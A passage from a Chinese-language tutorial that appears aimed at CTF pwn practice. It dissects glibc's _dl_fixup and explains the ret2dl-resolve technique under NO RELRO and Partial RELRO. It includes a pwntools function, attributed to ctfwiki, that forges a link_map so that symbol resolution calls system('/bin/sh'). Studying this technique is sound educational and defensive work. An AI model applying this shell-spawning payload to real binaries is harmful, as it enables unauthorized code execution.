style="color:#d9739f">)</span><span style="color:#80A665"> D_PTR</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#BD976A"> l_info</span><span style="color:#e6cc77">[</span><span style="color:#80A665">VERSYMIDX</span><span style="color:#666666"> </span><span style="color:#6394bf">(</span><span style="color:#DBD7CAEE">DT_VERSYM</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">]</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">	  ElfW</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">Half</span><span style="color:#d9739f">)</span><span style="color:#DBD7CAEE"> ndx </span><span style="color:#666666">=</span><span style="color:#BD976A"> vernum</span><span style="color:#d9739f">[</span><span style="color:#80A665">ELFW</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">R_SYM</span><span style="color:#e6cc77">)</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#BD976A">reloc</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">r_info</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">]</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7fff</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">	  version </span><span style="color:#666666">=</span><span style="color:#CB7676"> &#x26;</span><span style="color:#BD976A">l</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">l_versions</span><span style="color:#d9739f">[</span><span style="color:#DBD7CAEE">ndx</span><span style="color:#d9739f">]</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [6]</span><br><span style="color:#4D9375">	  if</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#BD976A">version</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">hash</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 0</span><span style="color:#d9739f">)</span><br><span style="color:#DBD7CAEE">	    version </span><span style="color:#666666">=</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#d4976c">}</span><br><br><span style="color:#DBD7CAEE">		...</span><br><br><span style="color:#DBD7CAEE">      result </span><span style="color:#666666">=</span><span style="color:#80A665"> _dl_lookup_symbol_x</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">strtab </span><span style="color:#CB7676">+</span><span style="color:#BD976A"> sym</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">st_name</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> l</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">sym</span><span style="color:#666666">,</span><span style="color:#BD976A"> l</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">l_scope</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">				    version</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ELF_RTYPE_CLASS_PLT</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flags</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [5]</span><br><br><span style="color:#DBD7CAEE">		...</span><br><br><span style="color:#758575DD">      /* Currently result contains the base load address (or link map)</span><br><span style="color:#758575DD">	 of the object that defines sym.  Now add in the symbol</span><br><span style="color:#758575DD">	 offset.  */</span><br><span style="color:#DBD7CAEE">      value </span><span style="color:#666666">=</span><span style="color:#80A665"> DL_FIXUP_MAKE_VALUE</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">result</span><span style="color:#666666">,</span><br><span style="color:#80A665">				   SYMBOL_ADDRESS</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">result</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> sym</span><span style="color:#666666">,</span><span style="color:#4D9375"> false</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [3]</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><span style="color:#4D9375">  else</span><br><span style="color:#666666">    </span><span style="color:#4d9375">{</span><br><span style="color:#758575DD">      /* We already found the symbol.  The module (and therefore its load</span><br><span style="color:#758575DD">	 address) is also known.  */</span><br><span style="color:#DBD7CAEE">      value </span><span style="color:#666666">=</span><span style="color:#80A665"> DL_FIXUP_MAKE_VALUE</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#80A665"> SYMBOL_ADDRESS</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> sym</span><span style="color:#666666">,</span><span style="color:#4D9375"> true</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // [4]</span><br><span style="color:#DBD7CAEE">      result </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> l</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#758575DD">  /* And now perhaps the relocation addend.  */</span><br><span style="color:#DBD7CAEE">  value </span><span style="color:#666666">=</span><span style="color:#80A665"> elf_machine_plt_value</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reloc</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> value</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#DBD7CAEE">	...</span><br><br><span style="color:#758575DD">  /* Finally, fix up the plt itself.  */</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">__glibc_unlikely</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#80A665">GLRO</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">dl_bind_not</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> value</span><span style="color:#666666">;</span><br><br><span style="color:#4D9375">  return</span><span style="color:#80A665"> elf_machine_fixup_plt</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> result</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> refsym</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> sym</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reloc</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> rel_addr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> value</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>函数源码我精简过了，流程非常清楚。</p>
<p>先来看 [1] 以及之前的局部变量定义部分，可以看到：</p>
<ol>
<li><code class="inline-code">symtab</code>、<code class="inline-code">strtab</code>、<code class="inline-code">pltgot</code> 都是直接通过 <code class="inline-code">l->l_info</code> 获取的，如 <code class="inline-code">pltgot</code> 的值就是 <code class="inline-code">.plt.got</code> 段的起始地址</li>
<li><code class="inline-code">reloc</code> 的值是 <code class="inline-code">JMPREL</code> 段中对应 <code class="inline-code">reloc_index</code> 的元素地址，这个段中元素的定义如下，其中 <code class="inline-code">r_offset</code> 是正在解析的函数的 got 表项（如果没开 pie 是真实地址，开了就是偏移），<code class="inline-code">r_info</code> 是复合字节，一般用的是高 4 字节</li>
</ol>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#1E754F">typedef</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> elf64_rela </span><span style="color:#2993a3">{</span><br><span style="color:#393A34">  Elf64_Addr r_offset</span><span style="color:#999999">;</span><span style="color:#A0ADA0">	/* Location at which to apply the action */</span><br><span style="color:#393A34">  Elf64_Xword r_info</span><span style="color:#999999">;</span><span style="color:#A0ADA0">	/* index and type of relocation */</span><br><span style="color:#393A34">  Elf64_Sxword r_addend</span><span style="color:#999999">;</span><span style="color:#A0ADA0">	/* Constant addend used to compute value */</span><br><span style="color:#2993a3">}</span><span style="color:#393A34"> Elf64_Rela</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#4D9375">typedef</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> elf64_rela </span><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">  Elf64_Addr r_offset</span><span style="color:#666666">;</span><span style="color:#758575DD">	/* Location at which to apply the action */</span><br><span style="color:#DBD7CAEE">  Elf64_Xword r_info</span><span style="color:#666666">;</span><span style="color:#758575DD">	/* index and type of relocation */</span><br><span style="color:#DBD7CAEE">  Elf64_Sxword r_addend</span><span style="color:#666666">;</span><span style="color:#758575DD">	/* Constant addend used to compute value */</span><br><span style="color:#5eaab5">}</span><span style="color:#DBD7CAEE"> Elf64_Rela</span><span style="color:#666666">;</span><br></code></pre></div>
<ol start="3">
<li><code class="inline-code">sym</code> 是 <code class="inline-code">symtab</code> 里对应的项，元素定义如下：</li>
</ol>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#1E754F">typedef</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> elf64_sym </span><span style="color:#2993a3">{</span><br><span style="color:#393A34">  Elf64_Word st_name</span><span style="color:#999999">;</span><span style="color:#A0ADA0">		/* 一个字符串表的索引值，如果为 0 说明符号没有名称 */</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#AB5959"> char</span><span style="color:#393A34">	st_info</span><span style="color:#999999">;</span><span style="color:#A0ADA0">	/* 指定符号的类型和绑定的属性 */</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#AB5959"> char</span><span style="color:#393A34">	st_other</span><span style="color:#999999">;</span><span style="color:#A0ADA0">	/* 定义了符号的可见性 */</span><br><span style="color:#393A34">  Elf64_Half st_shndx</span><span style="color:#999999">;</span><span style="color:#A0ADA0">		/* 每个符号表条目都与某个部分相关。该成员保存相关的段头表索引。 */</span><br><span style="color:#393A34">  Elf64_Addr st_value</span><span style="color:#999999">;</span><span style="color:#A0ADA0">		/* 相关符号的地址 */</span><br><span style="color:#393A34">  Elf64_Xword st_size</span><span style="color:#999999">;</span><span style="color:#A0ADA0">		/* 符号的大小 */</span><br><span style="color:#2993a3">}</span><span style="color:#393A34"> Elf64_Sym</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#4D9375">typedef</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> elf64_sym </span><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">  Elf64_Word st_name</span><span style="color:#666666">;</span><span style="color:#758575DD">		/* 一个字符串表的索引值，如果为 0 说明符号没有名称 */</span><br><span style="color:#CB7676">  unsigned</span><span style="color:#CB7676"> char</span><span style="color:#DBD7CAEE">	st_info</span><span style="color:#666666">;</span><span style="color:#758575DD">	/* 指定符号的类型和绑定的属性 */</span><br><span style="color:#CB7676">  unsigned</span><span style="color:#CB7676"> char</span><span style="color:#DBD7CAEE">	st_other</span><span style="color:#666666">;</span><span style="color:#758575DD">	/* 定义了符号的可见性 */</span><br><span style="color:#DBD7CAEE">  Elf64_Half st_shndx</span><span style="color:#666666">;</span><span style="color:#758575DD">		/* 每个符号表条目都与某个部分相关。该成员保存相关的段头表索引。 */</span><br><span style="color:#DBD7CAEE">  Elf64_Addr st_value</span><span style="color:#666666">;</span><span style="color:#758575DD">		/* 相关符号的地址 */</span><br><span style="color:#DBD7CAEE">  Elf64_Xword st_size</span><span style="color:#666666">;</span><span style="color:#758575DD">		/* 符号的大小 */</span><br><span style="color:#5eaab5">}</span><span style="color:#DBD7CAEE"> Elf64_Sym</span><span style="color:#666666">;</span><br></code></pre></div>
<p>然后接下来来看 [3] 和 [4] 也就是程序最终的返回结果，可以得知最终的结果是通过 <code class="inline-code">l->l_addr + sym->st_value</code> 计算得到的。</p>
<h3 id="no-relro" class="scroll-target"><a href="#no-relro"><code class="hash inline-code">#</code>NO RELRO</a></h3>
<p>在 NO RELRO 的情况下，.dynamic 节是可以被修改的，即重定位相关的各表项的基址我们可以修改到可控区域，准确地说是借用正常函数解析的各项表项，仅修改 STRTAB 表的基址，使得最后找到的函数字符串是我们可控的，然后达成任意函数执行的目的。</p>
<p>这个打法主要就是劫持 [5] 处 <code class="inline-code">strtab + sym->st_name</code> 的值，具体来说只需要用任意写原语修改 <code class="inline-code">strtab</code> 就行了。</p>
<h3 id="partial-relro" class="scroll-target"><a href="#partial-relro"><code class="hash inline-code">#</code>Partial RELRO</a></h3>
<p>通过阅读源码我们知道，保存在 ld.so 数据段内存中的 <code class="inline-code">linkmap->l_info</code> 是寻找函数的关键，它是一个存储动态指针的链表，如 <code class="inline-code">l_info[DT_STRTAB]</code>、<code class="inline-code">l_info[DT_JMPREL]</code>、<code class="inline-code">l_info[DT_SYMTAB]</code> 等每个元素都是指向 <code class="inline-code">Elfxx_Dyn</code> 结构体的指针，它们一般情况下指向 elf 中 dynamic 段中的各项 Elfxx_Dyn 条目。</p>
<p>于是我们可以修改 <code class="inline-code">linkmap->l_info[DT_STRTAB]</code> 到我们的可控区域，然后伪造 <code class="inline-code">Elf_Dyn</code> 条目和函数字符串即可，即我们回到了第 1 节所述情况，而不需要伪造多个条目，计算多个偏移了。</p>
<p>值得注意的是，在 x64 的情况下，该方法需要任意读写才能完成，因为我们需要控制 <code class="inline-code">&amp;link_map+0x1c8</code> 为 NULL，否则我们绕不开 [7] 的判断，程序仍然会在 [6] 崩溃。</p>
<p>因此接下来主要介绍只有任意写原语，没有任何 leak 的极端情况（如果能泄漏 linkmap 地址为什么还要打 re2dl？？？）</p>
<p>言归正传，既然绕不开 [7] 的判断（没有泄漏 linkmap 地址），那就绕过 [2] 的判断，也就是仅需要在构造 <code class="inline-code">Elf_Sym</code> 结构体时将 <code class="inline-code">Elf_Sym->st_other</code> 设置为非 0 即可绕开，进入 else 分支。</p>
<p>这两个分支的区别无非在于当前查询的符号知否是已知的：</p>
<ol>
<li>若不是已知的则找到待解析函数所在文件的 <code class="inline-code">link_map</code>，然后取出 <code class="inline-code">l_addr</code> 再计算</li>
<li>若是已知的则直接拿 <code class="inline-code">l->l_addr</code> 进行计算。</li>
</ol>
<p>ok 接下来只需要伪造一个 <code class="inline-code">linkmap</code> 就可以了，为了压缩 payload，我们尽可能的复用结构体。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0"># payload 参考 ctfwiki 的，0x100 bytes</span><br><span style="color:#AB5959">def</span><span style="color:#59873A"> construct_linkmap</span><span style="color:#2993a3">(</span><span style="color:#393A34">fake_linkmap_addr</span><span style="color:#999999">,</span><span style="color:#393A34"> known_func_ptr</span><span style="color:#999999">,</span><span style="color:#393A34"> offset</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#B5695977">    '''</span><br><span style="color:#B56959">    elf: is the ELF object</span><br><span style="color:#B56959">    fake_linkmap_addr: the address of the fake linkmap</span><br><span style="color:#B56959">    known_func_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']</span><br><span style="color:#B56959">    offset_of_two_addr: target_function_addr - *(known_function_ptr), where</span><br><span style="color:#B56959">                        target_function_addr is the function you want to execute</span><br><span style="color:#B56959">    WARNING: assert *(known_function_ptr-8) &#x26; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &#x26; 0x3</span><br><span style="color:#B56959">    WARNING: be careful that fake_linkmap is 0x100 bytes length</span><br><span style="color:#B56959">    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0</span><br><br><span style="color:#B56959">    linkmap:</span><br><span style="color:#B56959">        0x00: l_addr = offset_of_two_addr</span><br><span style="color:#B56959">      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8</span><br><span style="color:#B56959">        0x08: 17, tag of the JMPREL</span><br><span style="color:#B56959">        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL</span><br><span style="color:#B56959">      fake_JMPREL, addr = fake_linkmap_addr + 0x18</span><br><span style="color:#B56959">        0x18: p_r_offset, offset pointer to the resloved addr</span><br><span style="color:#B56959">        0x20: r_info</span><br><span style="color:#B56959">        0x28: append</span><br><span style="color:#B56959">      resolved addr</span><br><span style="color:#B56959">        0x30: r_offset</span><br><span style="color:#B56959">      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38</span><br><span style="color:#B56959">        0x38: 6, tag of the DT_SYMTAB</span><br><span style="color:#B56959">        0x40: known_function_ptr-8, p_fake_symbol_table</span><br><span style="color:#B56959">      command that you want to execute for system</span><br><span style="color:#B56959">        0x48: /bin/sh</span><br><span style="color:#B56959">      P_DT_STRTAB, pointer for DT_STRTAB</span><br><span style="color:#B56959">        0x68: fake a pointer, e.g., fake_linkmap_addr</span><br><span style="color:#B56959">      p_DT_SYMTAB, pointer for fake_DT_SYMTAB</span><br><span style="color:#B56959">        0x70: fake_linkmap_addr + 0x38</span><br><span style="color:#B56959">      p_DT_JMPREL, pointer for fake_DT_JMPREL</span><br><span style="color:#B56959">        0xf8: fake_linkmap_addr + 0x8</span><br><span style="color:#B5695977">    '''</span><br><br><span style="color:#393A34">    plt0 </span><span style="color:#999999">=</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">get_section_by_name</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">.plt</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">header</span><span style="color:#999999">.</span><span style="color:#393A34">sh_addr</span><br><span style="color:#393A34">    jmprel_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> fake_linkmap_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">8</span><br><span style="color:#393A34">    jmprel </span><span style="color:#999999">=</span><span style="color:#393A34"> fake_linkmap_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">18</span><br><span style="color:#393A34">    rela_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> fake_linkmap_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><br><br><span style="color:#393A34">    linkmap </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">{</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">00</span><span style="color:#999999">:</span><span style="color:#393A34"> offset </span><span style="color:#AB5959">&#x26;</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#2F798A">2</span><span style="color:#AB5959"> **</span><span style="color:#2F798A"> 64</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">08</span><span style="color:#999999">:</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">17</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">10</span><span style="color:#999999">:</span><span style="color:#393A34"> jmprel</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">18</span><span style="color:#999999">:</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">rela_addr </span><span style="color:#AB5959">-</span><span style="color:#393A34"> offset</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#2F798A">2</span><span style="color:#AB5959">**</span><span style="color:#2F798A">64</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><span style="color:#A0ADA0">  # r_offset</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">20</span><span style="color:#999999">:</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">28</span><span style="color:#999999">:</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">30</span><span style="color:#999999">:</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">38</span><span style="color:#999999">:</span><span style="color:#2F798A"> 6</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">40</span><span style="color:#999999">:</span><span style="color:#393A34"> known_func_ptr </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 8</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">48</span><span style="color:#999999">:</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">68</span><span style="color:#999999">:</span><span style="color:#393A34"> fake_linkmap_addr</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">70</span><span style="color:#999999">:</span><span style="color:#393A34"> rela_addr </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 8</span><span style="color:#999999">,</span><span style="color:#A0ADA0">  # r_info</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">f8</span><span style="color:#999999">:</span><span style="color:#393A34"> fake_linkmap_addr </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 8</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    resolve_call </span><span style="color:#999999">=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">plt0</span><span style="color:#AB5959">+</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">fake_linkmap_addr</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">linkmap</span><span style="color:#999999">,</span><span style="color:#393A34"> resolve_call</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">fake_linkmap</span><span style="color:#999999">,</span><span style="color:#393A34"> resolve_call </span><span style="color:#999999">=</span><span style="color:#393A34"> construct_linkmap</span><span style="color:#2993a3">(</span><span style="color:#393A34">bss</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">got</span><span style="color:#1e754f">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">read</span><span style="color:#B5695977">'</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#1e754f">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#1e754f">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">read</span><span style="color:#B5695977">'</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD"># payload 参考 ctfwiki 的，0x100 bytes</span><br><span style="color:#CB7676">def</span><span style="color:#80A665"> construct_linkmap</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">fake_linkmap_addr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> known_func_ptr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> offset</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#C98A7D77">    '''</span><br><span style="color:#C98A7D">    elf: is the ELF object</span><br><span style="color:#C98A7D">    fake_linkmap_addr: the address of the fake linkmap</span><br><span style="color:#C98A7D">    known_func_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']</span><br><span style="color:#C98A7D">    offset_of_two_addr: target_function_addr - *(known_function_ptr), where</span><br><span style="color:#C98A7D">                        target_function_addr is the function you want to execute</span><br><span style="color:#C98A7D">    WARNING: assert *(known_function_ptr-8) &#x26; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &#x26; 0x3</span><br><span style="color:#C98A7D">    WARNING: be careful that fake_linkmap is 0x100 bytes length</span><br><span style="color:#C98A7D">    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0</span><br><br><span style="color:#C98A7D">    linkmap:</span><br><span style="color:#C98A7D">        0x00: l_addr = offset_of_two_addr</span><br><span style="color:#C98A7D">      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8</span><br><span style="color:#C98A7D">        0x08: 17, tag of the JMPREL</span><br><span style="color:#C98A7D">        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL</span><br><span style="color:#C98A7D">      fake_JMPREL, addr = fake_linkmap_addr + 0x18</span><br><span style="color:#C98A7D">        0x18: p_r_offset, offset pointer to the resloved addr</span><br><span style="color:#C98A7D">        0x20: r_info</span><br><span style="color:#C98A7D">        0x28: append</span><br><span style="color:#C98A7D">      resolved addr</span><br><span style="color:#C98A7D">        0x30: r_offset</span><br><span style="color:#C98A7D">      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38</span><br><span style="color:#C98A7D">        0x38: 6, tag of the DT_SYMTAB</span><br><span style="color:#C98A7D">        0x40: known_function_ptr-8, p_fake_symbol_table</span><br><span style="color:#C98A7D">      command that you want to execute for system</span><br><span style="color:#C98A7D">        0x48: /bin/sh</span><br><span style="color:#C98A7D">      P_DT_STRTAB, pointer for DT_STRTAB</span><br><span style="color:#C98A7D">        0x68: fake a pointer, e.g., fake_linkmap_addr</span><br><span style="color:#C98A7D">      p_DT_SYMTAB, pointer for fake_DT_SYMTAB</span><br><span style="color:#C98A7D">        0x70: fake_linkmap_addr + 0x38</span><br><span style="color:#C98A7D">      p_DT_JMPREL, pointer for fake_DT_JMPREL</span><br><span style="color:#C98A7D">        0xf8: fake_linkmap_addr + 0x8</span><br><span style="color:#C98A7D77">    '''</span><br><br><span style="color:#DBD7CAEE">    plt0 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get_section_by_name</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">.plt</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">header</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sh_addr</span><br><span style="color:#DBD7CAEE">    jmprel_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> fake_linkmap_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">8</span><br><span style="color:#DBD7CAEE">    jmprel </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> fake_linkmap_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">18</span><br><span style="color:#DBD7CAEE">    rela_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> fake_linkmap_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">30</span><br><br><span style="color:#DBD7CAEE">    linkmap </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">{</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">00</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> offset </span><span style="color:#CB7676">&#x26;</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#4C9A91">2</span><span style="color:#CB7676"> **</span><span style="color:#4C9A91"> 64</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">08</span><span style="color:#666666">:</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">17</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">10</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> jmprel</span><span style="color:#666666">,</span><br><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">18</span><span style="color:#666666">:</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">rela_addr </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> offset</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#666666"> 